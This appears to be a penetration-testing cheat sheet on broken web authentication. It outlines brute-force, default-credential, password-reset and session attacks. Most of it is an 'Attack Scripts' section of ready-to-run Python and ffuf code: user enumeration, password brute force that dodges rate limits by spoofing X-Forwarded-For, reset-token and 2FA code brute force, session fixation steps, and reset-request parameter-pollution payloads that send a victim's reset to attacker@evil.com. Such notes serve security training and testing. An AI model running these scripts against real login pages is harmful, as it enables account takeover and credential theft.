title: Broken Authentication
html:
Broken Authentication

Categories of Authentication

- Knowledge: passwords, PINs, ... - Ownership: ID cards, TOTP - Inherence: Biometric authentication

Brute-Force Attacks

- User Enumeration - Brute-Forcing Passwords - Brute-Forcing Password Reset Tokens - Brute-Forcing 2FA Codes - Bypassing Brute-Force Protection - Rate Limit: X-Forwarded-For HTTP Header - CAPTCHAs: Look for CAPTCHA solution in HTML code

Password Attacks

- Default Credentials - CIRT.net - SecLists Default Credentials - SCADA - Vulnerable Password Reset - Guessable Security Questions - Username Injection in Reset Request

Authentication Bypasses

- Accessing the protected page directly - Manipulating HTTP Parameters to access protected pages

Session Attacks

- Brute-Forcing cookies with insufficient entropy - Session Fixation - Attacker obtains valid session identifier - Attacker coerces victim to use this session identifier (social engineering) - Victim authenticates to the vulnerable web application - Attacker knows the victim's session identifier and can hijack their account - Improper Session Timeout - Sessions should expire after an appropriate time interval - Session validity duration depends on the web application

Attack Scripts

User Enumeration (timing / response difference)

import requests, time

url = 'http://TARGET/login'
users = ['admin', 'administrator', 'root', 'user', 'test']

for u in users:
    t0 = time.time()
    r = requests.post(url, data={'username': u, 'password': 'invalid_pass_xyz'})
    elapsed = time.time() - t0
    print(f'{u}: {r.status_code} | {len(r.text)} bytes | {elapsed:.3f}s | {"EXISTS" if "Invalid password" in r.text else "NOT FOUND"}')

Password Brute-Force with Rate Limit Bypass

import requests

url = 'http://TARGET/login'
wordlist = '/usr/share/wordlists/rockyou.txt'
username = 'admin'
ip_counter = 1

with open(wordlist) as f:
    for i, password in enumerate(f):
        password = password.strip()
        headers = {'X-Forwarded-For': f'10.0.0.{ip_counter}'}
        r = requests.post(url, data={'username': username, 'password': password}, headers=headers)
        if 'Invalid' not in r.text and r.status_code != 401:
            print(f'[+] FOUND: {password}')
            break
        if i % 10 == 0:
            ip_counter += 1  # rotate IP every 10 attempts

Password Reset Token Brute-Force

import requests, string, itertools

base_url = 'http://TARGET/reset?token='
charset = string.digits  # or string.ascii_lowercase + string.digits

# If token is numeric 6-digit
for token in range(100000, 999999):
    r = requests.get(base_url + str(token))
    if 'expired' not in r.text.lower() and r.status_code == 200:
        print(f'[+] Valid token: {token}')
        break

2FA Code Brute-Force (TOTP 6-digit)

import requests

url = 'http://TARGET/2fa/verify'
cookies = {'session': 'SESSION_AFTER_PASSWORD'}

for code in range(0, 1000000):
    r = requests.post(url, data={'code': f'{code:06d}'}, cookies=cookies)
    if 'Invalid' not in r.text:
        print(f'[+] 2FA code: {code:06d}')
        break

Session Fixation Exploit

1. GET http://TARGET/login   → server sets Set-Cookie: session=FIXED_VALUE (before login)
2. Trick victim to visit: http://TARGET/login (with attacker's session cookie injected)
3. Victim logs in → server binds FIXED_VALUE to victim's account
4. Attacker sends requests with session=FIXED_VALUE → authenticated as victim

Username Injection in Password Reset

# Try injecting victim's email alongside attacker's
POST /reset
email=victim@target.com&email=attacker@evil.com

# Or via parameter pollution
POST /reset
email=attacker@evil.com%20email=victim@target.com

# Or via separator
email=victim@target.com,attacker@evil.com

ffuf Login Brute-Force

ffuf -u http://TARGET/login \
  -X POST \
  -d 'username=admin&password=FUZZ' \
  -w /usr/share/wordlists/rockyou.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fc 200 \
  -fs 1234
